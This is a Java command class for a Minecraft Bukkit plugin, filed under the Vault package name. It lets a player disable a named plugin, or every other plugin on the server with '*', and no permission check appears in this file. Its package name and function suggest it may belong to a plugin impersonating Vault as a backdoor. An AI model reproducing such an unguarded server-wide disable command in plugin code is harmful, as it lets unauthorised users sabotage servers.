package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;

public class Disable extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("disable <plugin>"));
		} else {
			if (args[1].equals("*")) {
				for (Plugin pl : Bukkit.getServer().getPluginManager().getPlugins()) {
					if (!pl.getName().equals(plugin.getDescription().getName())) {
						API.disablePlugin(pl.getName());
					}
				}
				p.sendMessage(Settings.PREFIX("You disabled all of the plugins on the server!"));
			} else {
				if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
				p.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
			} else if (Bukkit.getPluginManager().getPlugin(args[1]).isEnabled()) {
				API.disablePlugin(args[1]);
				p.sendMessage(Settings.PREFIX(Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is now disabled"));
			} else {
				p.sendMessage(Settings.PREFIX(args[1] + " is already disabled!"));
			}
		}
	}
	}

}
